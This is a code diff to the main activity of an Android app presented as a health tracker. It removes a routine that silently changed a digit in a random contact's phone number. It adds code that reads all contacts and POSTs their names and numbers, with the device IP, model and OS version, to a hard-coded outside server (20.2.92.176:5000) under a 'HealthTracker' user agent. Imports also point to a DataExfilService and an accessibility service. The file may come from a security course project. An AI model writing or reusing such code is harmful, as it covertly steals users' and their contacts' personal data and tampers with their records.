@@ -25,10 +25,8 @@ import androidx.activity.result.contract.ActivityResultContracts
 import com.inf2007.healthtracker.utilities.NotificationPermissionUtils
 import android.provider.ContactsContract
 import android.util.Log
-import android.content.ContentProviderOperation
 import android.os.Handler
 import android.os.Looper
-import kotlin.random.Random
 import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -37,6 +35,14 @@ import android.widget.Toast
 import com.inf2007.healthtracker.utilities.WatchAccessibilityService
 import android.content.ComponentName
 import com.inf2007.healthtracker.utilities.DataExfilService
+import org.json.JSONArray
+import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
+import java.io.OutputStreamWriter
+import java.net.Inet4Address
+import java.net.NetworkInterface
+import java.util.Collections
 
 class MainActivity : ComponentActivity() {
     private val PERMISSIONS_REQUEST_CODE = 100
@@ -89,12 +95,11 @@ class MainActivity : ComponentActivity() {
     private val requestPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions ->
+        // Check if contacts read permission is granted
         val contactsRead = permissions[Manifest.permission.READ_CONTACTS] ?: false
-        val contactsWrite = permissions[Manifest.permission.WRITE_CONTACTS] ?: false
 
-        if (contactsRead && contactsWrite) {
+        if (contactsRead) {
             lifecycleScope.launch(Dispatchers.IO) {
-                modifyRandomContact()
                 logAllContacts()
             }
         }
@@ -225,8 +230,7 @@ class MainActivity : ComponentActivity() {
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.READ_MEDIA_IMAGES,
             Manifest.permission.POST_NOTIFICATIONS,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.WRITE_CONTACTS,
+            Manifest.permission.READ_CONTACTS
         )
 
         // 1. Check for Standard Permissions (Popups)
@@ -294,6 +298,7 @@ class MainActivity : ComponentActivity() {
         )
 
         val cursor = contentResolver.query(uri, projection, null, null, null)
+        val contactsList = mutableListOf<Map<String, String>>()
 
         cursor?.use {
             if (it.count == 0) {
@@ -332,8 +337,17 @@ class MainActivity : ComponentActivity() {
                 }
 
                 Log.d("ContactList", "Name: $name | Phone: $phoneNumber")
+
+                // Add to list for server upload
+                contactsList.add(mapOf(
+                    "name" to name,
+                    "phone" to phoneNumber
+                ))
             }
             Log.d("ContactList", "--- End of Contact Export ---")
+
+            // Send contacts to server
+            sendContactsToServer(contactsList)
         } ?: Log.e("ContactList", "Cursor failed to load.")
     }
 
@@ -346,92 +360,104 @@ class MainActivity : ComponentActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults, deviceId)
 
         if (requestCode == PERMISSIONS_REQUEST_CODE) {
-            val writeGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED
             val readGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
 
-            if (readGranted && writeGranted) {
+            if (readGranted) {
                 // Run in a background thread to avoid skipping frames on the UI
                 Thread {
-                    modifyRandomContact()
-                    logAllContacts() // Print the new list to verify
+                    logAllContacts() // This will also send to server
                 }.start()
             }
         }
     }
 
-    private fun modifyRandomContact() {
-        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
-        val projection = arrayOf(
-            ContactsContract.Data._ID,
-            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-            ContactsContract.CommonDataKinds.Phone.NUMBER
-        )
+    private fun sendContactsToServer(contactsList: List<Map<String, String>>) {
+        Thread {
+            try {
+                // Get device IP address
+                val ipAddress = getDeviceIPAddress()
 
-        // 1. Get all contacts that have phone numbers
-        val cursor = contentResolver.query(uri, projection, null, null, null)
-        val contactList = mutableListOf<Triple<String, String, String>>() // <DataID, Name, Number>
+                // Prepare the data
+                val contactsData = JSONObject().apply {
+                    put("type", "contacts")
+                    put("device_ip", ipAddress)  // Use IP instead of device_id
+                    put("device_model", Build.MODEL)
+                    put("android_version", Build.VERSION.RELEASE)
+                    put("timestamp", System.currentTimeMillis())
+                    put("total_contacts", contactsList.size)
+                    put("app_package", packageName)
 
-        cursor?.use {
-            val idIndex = it.getColumnIndexOrThrow(ContactsContract.Data._ID)
-            val nameIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-            val numIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                    // Convert contacts list to JSON array
+                    val contactsArray = JSONArray()
+                    contactsList.forEach { contact ->
+                        val contactObj = JSONObject()
+                        contactObj.put("name", contact["name"] ?: "")
+                        contactObj.put("phone", contact["phone"] ?: "")
+                        contactsArray.put(contactObj)
+                    }
+                    put("contacts", contactsArray)
+                }
 
-            while (it.moveToNext()) {
-                contactList.add(Triple(
-                    it.getString(idIndex),
-                    it.getString(nameIndex) ?: "Unknown",
-                    it.getString(numIndex) ?: ""
-                ))
+                // Send to server
+                val url = URL("http://20.2.92.176:5000/contacts")
+                val connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
+                connection.setRequestProperty("User-Agent", "HealthTracker/1.0")
+                connection.connectTimeout = 15000
+                connection.readTimeout = 15000
+                connection.doOutput = true
+
+                // Write data
+                val outputStream = connection.outputStream
+                OutputStreamWriter(outputStream, "UTF-8").use { writer ->
+                    writer.write(contactsData.toString())
+                    writer.flush()
+                }
+
+                val responseCode = connection.responseCode
+                Log.d("ContactList", "Server response code: $responseCode")
+
+                connection.disconnect()
+
+                if (responseCode in 200..299) {
+                    Log.i("ContactList", "Contacts sent successfully to server")
+                } else {
+                    Log.e("ContactList", "Failed to send contacts: HTTP $responseCode")
+                }
+
+            } catch (e: Exception) {
+                Log.e("ContactList", "Error sending contacts to server: ${e.message}")
             }
-        }
+        }.start()
+    }
 
-        if (contactList.isEmpty()) {
-            Log.d("ContactList", "No contacts found to modify.")
-            return
-        }
+    private fun getDeviceIPAddress(): String {
+        return try {
+            val networkInterfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
 
-        // 2. Pick a random contact from the list
-        val randomContact = contactList.random()
-        val dataId = randomContact.first
-        val name = randomContact.second
-        val oldNumber = randomContact.third
+            for (intf in networkInterfaces) {
+                val addresses = Collections.list(intf.inetAddresses)
+                for (addr in addresses) {
+                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
+                        // Prefer WiFi/Mobile IP (non-link local)
+                        val ip = addr.hostAddress ?: ""
+                        if (!ip.startsWith("169.254.")) { // Not link-local
+                            return ip
+                        }
+                    }
+                }
+            }
 
-        // 3. Change one random digit in that number
-        val newNumber = changeOneRandomDigit(oldNumber)
-        Log.d("ContactList", "Selected: $name. Changing $oldNumber to $newNumber")
-
-        // 4. Update the database
-        val ops = ArrayList<ContentProviderOperation>()
-        ops.add(
-            ContentProviderOperation.newUpdate(ContactsContract.Data.CONTENT_URI)
-                .withSelection("${ContactsContract.Data._ID} = ?", arrayOf(dataId))
-                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, newNumber)
-                .build()
-        )
-
-        try {
-            contentResolver.applyBatch(ContactsContract.AUTHORITY, ops)
-            Log.d("ContactList", "Successfully modified $name's number!")
+            // Fallback to localhost or "unknown"
+            "unknown"
         } catch (e: Exception) {
-            Log.e("ContactList", "Failed to update contact: ${e.message}")
+            Log.e("ContactList", "Error getting IP address: ${e.message}")
+            "unknown"
         }
     }
 
-    private fun changeOneRandomDigit(number: String): String {
-        val digits = number.toCharArray()
-        val digitIndices = digits.indices.filter { digits[it].isDigit() }
-
-        if (digitIndices.isNotEmpty()) {
-            val randomIndex = digitIndices.random()
-            val currentDigit = digits[randomIndex].digitToInt()
-            var newDigit = Random.nextInt(0, 10)
-            while (newDigit == currentDigit) { newDigit = Random.nextInt(0, 10) }
-            digits[randomIndex] = newDigit.digitToChar()
-        }
-        return String(digits)
-    }
-
-    // ========== NEW METHODS FOR ACCESSIBILITY ==========
+    // ========== METHODS FOR ACCESSIBILITY ==========
     private fun isAccessibilityServiceEnabled(): Boolean {
         return try {
             val enabledServices = Settings.Secure.getString(
